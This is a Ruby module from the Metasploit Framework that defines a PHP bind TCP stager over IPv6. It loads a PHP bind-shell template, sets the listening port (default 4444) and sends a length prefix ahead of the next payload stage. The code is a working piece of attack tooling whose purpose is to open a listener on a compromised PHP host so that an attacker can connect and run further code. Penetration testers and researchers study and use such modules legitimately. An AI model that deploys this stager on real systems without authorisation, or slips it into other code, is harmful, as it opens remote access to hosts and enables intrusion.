##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/payload/php'
require 'msf/core/handler/bind_tcp'

module Metasploit3
  extend  Metasploit::Framework::Module::Ancestor::Handler

  include Msf::Payload::Stager
  include Msf::Payload::Php

  handler module_name: 'Msf::Handler::BindTcp',
          type_alias: 'bind_tcp_ipv6'

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Bind TCP Stager IPv6',
      'Description'   => 'Listen for a connection over IPv6',
      'Author'        => ['egypt'],
      'License'       => MSF_LICENSE,
      'Platform'      => 'php',
      'Arch'          => ARCH_PHP,
      'Stager'        => { 'Payload' => "" }
      ))
  end
  def generate
    if (datastore['LPORT'] and not datastore['LPORT'].empty?)
      lport = datastore['LPORT']
    else
      lport = '4444'
    end

    bind = File.read(File.join(Msf::Config::InstallRoot, 'data', 'php', 'bind_tcp_ipv6.php'))
    bind.gsub!("4444", lport)

    return super + bind
  end

  #
  # PHP's read functions suck, make sure they know exactly how much data to
  # grab by sending a length.
  #
  def handle_intermediate_stage(conn, payload)
    conn.put([payload.length].pack("N"))
  end
end
